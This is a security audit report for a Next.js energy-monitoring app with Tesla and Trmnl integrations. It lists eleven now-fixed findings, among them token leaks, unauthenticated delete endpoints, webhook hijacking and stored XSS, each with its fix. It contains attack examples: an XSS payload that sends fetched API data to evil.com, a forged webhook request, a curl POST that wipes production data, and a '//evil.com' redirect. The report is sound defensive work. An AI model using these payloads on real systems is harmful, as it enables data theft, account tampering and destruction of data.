# Security Findings

Audit performed 2026-05-12 against branch `fix-security` (commit `fbf3d80`).
Four parallel audit passes covered: API routes, auth/session flows, Trmnl integration, data/secrets layer.
All claims below were verified by direct file read after the agents reported them. Confidence ≥ 8 unless noted.

## Status legend

- [ ] Open
- [x] Fixed (record commit hash inline when closing)

---

## HIGH severity

### 1. Tesla refresh tokens exposed in admin page HTML

- [x] **File:** `cmd/next-app/src/app/admin/page.tsx:18` (via `cmd/next-app/src/lib/user-repo.ts` `getAllUsers()`)
- **Category:** secret_leak / data_exposure
- **Confidence:** 9

The admin page calls `userRepo.getAllUsers()` (which runs `SELECT u.* FROM "User"`, including `access_token` and `refresh_token`) and passes the entire `users` array as a prop to `<AdminDashboard users={users} />`. `AdminDashboard` is a client component, so Next.js serializes the props into the RSC payload embedded in the response HTML.

**Impact:** Every PWUsage user's Tesla refresh token (long-lived, full Fleet API access) appears in plain text inside the admin's browser DOM source. Exfil vectors: malicious browser extension, corporate MITM proxy, screen recording, HAR file, any future XSS sink in the admin tree.

**Fix:** Project the SELECT to a safe column set, or map to a DTO at the repo boundary. Strip `access_token` / `refresh_token` from `getAllUsers()` so no caller can accidentally leak them.

---

### 2. Tesla + Trmnl tokens exposed in site settings page HTML

- [x] **File:** `cmd/next-app/src/app/site/[id]/page.tsx:315`
- **Category:** secret_leak
- **Confidence:** 9

`<SettingsView site={finalSite} installation={installation} />` is a client component (`cmd/next-app/src/components/site/SettingsView.tsx:1` declares `'use client'`).
- `finalSite` is the `SiteWithTariffs` from `siteRepo.getSite()` and carries `access_token` / `refresh_token` (Tesla tokens — see `cmd/next-app/src/lib/site-repo.ts:47-48, 165-166`).
- `installation` is the full row from `getInstallationBySiteId()` (`SELECT * FROM "TrmnlInstallation"`) and carries the Trmnl device `access_token`.

Both objects are serialized into the RSC payload. `SettingsView` only consumes `installation.plugin_setting_id` and `installation.json`, so the tokens are unused payload leaking to the client.

**Impact:** Site owners receive their own Tesla refresh token and Trmnl access token in the page HTML on every settings visit. The Trmnl access token is the bearer that gates `/api/trmnl/markup` for the device, so its leak is independently meaningful.

**Fix:** Map both objects to safe DTOs before passing to `<SettingsView>`. Strip `access_token` / `refresh_token` at the page boundary, or — preferred — project them out at the repo boundary so this can't recur.

---

### 3. Unauthenticated production data-destruction endpoints

- [x] **Files:**
  - `cmd/next-app/src/app/api/debug/delete-today/route.ts:6` (POST)
  - `cmd/next-app/src/app/api/debug/cleanup-after-3pm/route.ts:6` (POST)
  - `cmd/next-app/src/app/api/debug/solar-data/route.ts:6` (GET)
  - `cmd/next-app/src/app/api/debug/timestamps/route.ts:6` (GET)
  - `cmd/next-app/src/app/api/debug/day-filter/route.ts:6` (GET)
- **Category:** missing_auth / data_destruction
- **Confidence:** 10

Two POST handlers run anonymous, irreversible `DELETE FROM "EnergyData"` statements against a hardcoded production site_id (`2252268092126997`). No `NODE_ENV` guard, no admin check, no `CRON_SECRET`. `cmd/next-app/src/proxy.ts` does not gate these paths. The three GET handlers leak the same site's energy data unauthenticated.

**Impact:** `curl -X POST https://pwusage.fm.rodeo/api/debug/delete-today` permanently deletes a slice of real EnergyData. Anyone on the internet can run it.

**Fix:** Delete the entire `cmd/next-app/src/app/api/debug/` subtree (move the queries into `scripts/` invoked via `tsx`), or wrap each handler in `isUserAdmin() && process.env.NODE_ENV !== 'production'`.

---

### 4. Trmnl webhook accepts unsigned requests; can hijack pending installs

- [x] **File:** `cmd/next-app/src/app/api/trmnl/webhook/route.ts`
- **Category:** missing_auth / data_tampering
- **Confidence:** 9

The POST handler performs no signature, shared-secret, IP, or JWT verification. It accepts any JSON body and uses `user.uuid`, `user.plugin_setting_id`, and `user.email` to:

1. Claim an existing pending row by `plugin_setting_id` with no time bound (`getInstallationByPendingPluginId`).
2. Fall back to the most-recent loose-pending row within 15 minutes (commit `fbf3d80` added the time bound).
3. Write `user.email` into the linked `User` row when its email is currently NULL.

`plugin_setting_id` is a small integer that appears in public Trmnl URLs (`/plugin_settings/12345`) and is therefore enumerable.

**Impact:** While Alice's install is pending, an attacker enumerates `plugin_setting_id` and sends:

```http
POST /api/trmnl/webhook
{"user":{"uuid":"00000000-...","plugin_setting_id":12345,"email":"attacker@evil.com"}}
```

The webhook claims Alice's pending row, rewrites it to the attacker's UUID, and silently sets `User.email = attacker@evil.com` if it was NULL. Alice's real device subsequently fails to fetch markup. The attacker can't read Alice's data (the bearer check on `/api/trmnl/markup` preserves Alice's `access_token`) — but they've tampered with the linked User row and broken her install.

**Fix:** Require Trmnl signature verification on the webhook. Reuse the existing `verifyTrmnlToken` helper (or validate an HMAC header derived from `TRMNL_CLIENT_SECRET`). Reject any request whose verified `sub` ≠ `user.uuid` or whose claim ≠ `plugin_setting_id`. Remove the email-overwrite path from this endpoint, or gate it behind verification.

---

### 5. Trmnl markup auth bypass when `installation.access_token` is NULL

- [x] **File:** `cmd/next-app/src/app/api/trmnl/markup/route.ts:163` (and `cmd/next-app/src/app/api/trmnl/uninstall/route.ts:33`)
- **Category:** broken_authentication
- **Confidence:** 8

```ts
if (installation.access_token && (!authHeader || !authHeader.startsWith('Bearer ') ||
                                  authHeader.split(' ')[1] !== installation.access_token)) {
    return getQrResponse(...);
}
```

When `installation.access_token` is `NULL`, the `&&` short-circuits and the guard is entirely skipped. The same pattern repeats in `uninstall/route.ts` where it permits an unauth DELETE of the install row.

**Impact:** Anyone who learns an installation `uuid` (UUIDs leak via QR codes printed on devices, shoulder-surfing, screenshots, accidental sharing) and finds an installation whose `access_token` happens to be `NULL` can fetch the owner's full dashboard with no Authorization header, or delete the install row entirely.

**Fix:** Fail closed when `access_token` is `NULL`. Either reject the request, or require a valid Trmnl JWT via `verifyTrmnlToken(token, uuid)`. The current "missing token means no auth required" default is unsafe for both routes.

---

### 6. Stored XSS via Tesla site name → unsandboxed iframe

- [x] **Files:**
  - `cmd/next-app/src/lib/trmnl-renderer.ts:51,107,132`
  - `cmd/next-app/src/lib/trmnl/components.ts:150,184`
  - Sink: `cmd/next-app/src/components/trmnl/TrmnlLivePreview.tsx:289-300`
- **Category:** stored_xss
- **Confidence:** 8

Site/tariff/TOU names are interpolated raw into HTML (verified via grep). The rendered markup is fed to `buildTrmnlPreviewDocument(markup)` and dropped into an `<iframe srcDoc={...}>` with **no `sandbox` attribute**. An `srcdoc` iframe without `sandbox` inherits the embedding document's origin, so any `<script>` runs as `pwusage.fm.rodeo` and can `fetch('/api/...')` with the viewer's `site_auth` cookie attached.

**Impact:** A site owner renames their Powerwall in the Tesla app to:
```
Home</span><script>fetch('https://evil.com/x?d='+btoa(await(await fetch('/api/sites')).text()))</script><span>
```
The payload is stored on `Site.name`. The preview iframe renders on `/trmnl/manage` and inside `SettingsView`. Critically, `verifySiteAccess` grants admins access to any site (`cmd/next-app/src/lib/auth-checks.ts:53`) — so a malicious site owner can compromise an admin who views the malicious site's settings page. Privilege escalation to admin session.

**Fix:** HTML-escape every interpolated string in `trmnl-renderer.ts` and `trmnl/components.ts` with a small `escapeHtml(s)` helper (`& < > " '` → entities). Defense-in-depth: add `sandbox=""` (omit `allow-scripts`) to the preview `<iframe>` in `TrmnlLivePreview.tsx`.

---

## MEDIUM severity

### 7. OAuth `state` and `nonce` generated with `Math.random()`

- [x] **File:** `cmd/next-app/src/app/login/route.ts:9-10`
- **Category:** weak_randomness / oauth_state
- **Confidence:** 8

```ts
const state = Math.random().toString(36).substring(2, 15);
const nonce = Math.random().toString(36).substring(2, 15);
```

V8's `Math.random()` is xorshift128+, not a CSPRNG. With several consecutive outputs from the same V8 instance, the internal state is recoverable (`v8-randomness-predictor`).

**Impact:** State-mixing / login-CSRF — an attacker who can sample state/nonce values from the same Vercel function instance during the victim's login window can predict the victim's `state`, then craft a callback that binds the attacker's Tesla `code` to the victim's session. The bar is higher on Vercel because new function instances reset V8 state, but deterministic PRNG for OAuth state is unacceptable regardless.

**Fix:** Use `crypto.randomBytes(32).toString('hex')` or `crypto.randomUUID()` for both values. One-line change.

---

### 8. Tesla `id_token` signature never verified

- [x] **File:** `cmd/next-app/src/app/auth/tesla-callback/route.ts:56,96`
- **Category:** oidc_validation / authentication
- **Confidence:** 8 (correctness: 10; practical exploitability: lower)

The callback identifies the user from `jwt.decode(authData.id_token)` — zero cryptographic verification. The decoded `sub` becomes `User.id` and is embedded in the issued `site_auth` JWT. No `iss`, `aud`, `exp`, or signature check. `jwks-rsa` is already a dependency (used for Trmnl JWTs), so the plumbing exists.

**Impact:** OIDC requires RPs to verify the `id_token` signature. Today, the exploit requires compromising HTTPS to `auth.tesla.com` (HSTS / pinned) — a high bar. But this is the only cryptographic identity binding in the OAuth flow, so any partial compromise of the upstream OAuth response becomes a full identity-takeover.

**Fix:** Replace `jwt.decode` with `jwt.verify` against Tesla's JWKS endpoint. Pin `algorithms: ['RS256']` and validate `iss`, `aud` (configured client_id), `exp`.

---

### 9. Stale JWT after Tesla revocation + indefinite sliding refresh

- [x] **Files:**
  - `cmd/next-app/src/lib/auth-jwt.ts:49-67` (`checkRefreshNeeded`)
  - `cmd/next-app/src/lib/auth-checks.ts:47-71` (`verifySiteAccess`, `getAuthorizedSiteIds`)
  - `cmd/next-app/src/proxy.ts`
- **Category:** session_lifecycle / authorization_staleness
- **Confidence:** 9

Authorization is decided entirely from claims in the JWT at issuance. `verifySiteAccess` and `getAuthorizedSiteIds` never consult the DB. The proxy re-issues a fresh 7-day JWT whenever the existing one has <24h remaining, with no absolute lifetime cap.

**Impact:**
1. After Tesla revokes a user (`auth_status='revoked'` set in `tesla-token-repo.ts`), the user's existing `site_auth` cookie continues to work and can be refreshed indefinitely.
2. A stolen `site_auth` cookie is durable — used once every 7 days, it never expires. There is no server-side way to revoke a single session short of rotating `AUTH_SECRET` (which logs out everyone).
3. If `Site.user_id` is reassigned, the previous owner's JWT still lists the site in `sites[]`.

**Fix:** Either (a) consult `User.auth_status` / `is_active` in `verifySiteAccess` / `checkRefreshNeeded` and refuse refresh when non-active, or (b) add a `token_version` integer on `User`, embed it in the JWT, and reject tokens with stale versions (bumping the column instantly invalidates all sessions for that user). Optionally cap absolute session lifetime (30 days even with sliding refresh).

---

## Defense-in-depth (not a primary finding)

### 10. Open-redirect via protocol-relative URL

- [x] **Files:**
  - `cmd/next-app/src/app/auth/tesla-callback/route.ts:170`
  - `cmd/next-app/src/app/login/route.ts:15`
- **Category:** open_redirect
- **Confidence:** 9 (technical bypass) / 6 (meaningful impact)

`callback.startsWith('/')` admits `//evil.com/path`, which browsers resolve cross-origin from a `Location` header. The previous code path that leaked OAuth tokens via redirect URL is now gone (commit `fbf3d80`), so the residual surface is phishing-UX only (no token exfil, HttpOnly `site_auth` stays on `pwusage.fm.rodeo`). The fix is one line:

```ts
const isInternalPath = savedCallback?.startsWith('/')
  && !savedCallback.startsWith('//')
  && !savedCallback.startsWith('/\\');
```

Apply at both the storage site (`login/route.ts`) and the redirect sink (`tesla-callback/route.ts`).

---

## LOW severity

### 11. Stack trace returned in `/api/import` error response

- [x] **File:** `cmd/next-app/src/app/api/import/route.ts:50`
- **Category:** information_disclosure
- **Confidence:** 8

On exception the handler returns `{ error: err.message, stack: err.stack }` to the client. Stack traces leak internal paths (`/var/task/...`, library internals). Trigger requires authentication, so blast radius is limited.

**Fix:** Return `{ error: err.message }` only; log the stack server-side.

---

## Items examined and not reported

- **SQL injection** — all non-debug `pool.query` / `client.query` calls use parameterized statements. String interpolation in `site-repo.ts` is internal constants.
- **SSRF in importer / sync** — outbound fetches use hardcoded Tesla / Trmnl hosts; no attacker-controlled host or protocol.
- **`/api/cron/*`** — both routes check `Authorization: Bearer ${CRON_SECRET}` correctly.
- **Token logging** — no `console.log` in routes reviewed emits `access_token` / `refresh_token` values.
- **`/api/upload`** — admin-gated via `isUserAdmin()`; Vercel Blob keys are opaque, no filesystem traversal.
- **`/api/announcements`** — public GET by design; write operations admin-gated.
- **`jsonwebtoken` algorithm confusion** — v9 restricts default algorithms when a string secret is provided; not exploitable.
- **`AUTH_SECRET` fail-closed** — the new throw in `auth-jwt.ts:4-6` is correctly applied at module init.
- **Cookie attributes** — `site_auth` is HttpOnly, Secure in production, SameSite defaults to Lax — acceptable.
- **`/api/trmnl/manage`** — site-relink path properly gated by `validateSiteAccess` on the target site.
- **`verifyTrmnlToken`** — correctly pins `RS256` and verifies `sub === expectedUuid`.

---

## Summary

| # | Severity | Component | Issue |
|---|---|---|---|
| 1 | HIGH | `app/admin/page.tsx` | Tesla refresh tokens for all users in admin RSC payload |
| 2 | HIGH | `app/site/[id]/page.tsx` | Tesla + Trmnl tokens for owner in site settings RSC payload |
| 3 | HIGH | `app/api/debug/*` | Unauth POST destroys production EnergyData; unauth GET leaks it |
| 4 | HIGH | `app/api/trmnl/webhook` | No signature verification; can hijack pending installs, overwrite User.email |
| 5 | HIGH | `app/api/trmnl/markup` | Auth bypass when `installation.access_token` is NULL |
| 6 | HIGH | `lib/trmnl-renderer` + `TrmnlLivePreview` | Stored XSS via Tesla site name → unsandboxed iframe (admin compromise vector) |
| 7 | MED | `app/login/route.ts` | OAuth state/nonce use `Math.random()` |
| 8 | MED | `app/auth/tesla-callback/route.ts` | Tesla id_token signature never verified |
| 9 | MED | `lib/auth-jwt`, `lib/auth-checks` | JWT bypasses revocation; indefinite sliding refresh |
| 10 | (DiD) | login + tesla-callback | Protocol-relative open redirect (`//evil.com`) |
| 11 | LOW | `app/api/import` | Stack trace leaked in error response |

## Recommended priority order

1. **Findings 1, 2, 3** — immediate. Token leaks are durable secret exposure; the debug endpoints are an internet-reachable destructive surface.
2. **Findings 4, 5** — Trmnl integration auth gaps with concrete attack paths.
3. **Finding 6** — XSS with admin-compromise vector; one-line escape fix.
4. **Findings 7, 8, 9** — auth-flow hardening; plan as one auth-hardening pass.
5. **Findings 10, 11** — small fixes, bundle with whichever auth pass closes 7–9.
